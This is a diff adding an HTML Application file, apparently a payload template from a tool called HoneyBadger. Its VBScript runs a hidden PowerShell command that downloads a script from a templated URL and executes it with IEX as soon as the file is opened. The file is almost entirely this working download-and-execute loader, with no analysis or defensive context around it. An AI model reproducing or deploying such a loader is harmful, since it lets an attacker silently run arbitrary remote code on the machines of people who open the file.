@@ -1,0 +1,19 @@
+<head>
+<title>Honey</title>
+<HTA:APPLICATION 
+     ID="Honey" 
+     APPLICATIONNAME="HTAHoney"
+     SCROLL="yes"
+     SINGLEINSTANCE="yes"
+>
+</head>
+
+<script language="VBScript" >
+sCmd = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('%hrefString%'))"
+Set oShell = CreateObject("Wscript.Shell")
+iResult = oShell.Run(sCmd, 0, true)
+</script>
+<body>
+<h1 >HoneyBadger</h1>
+
+</body>
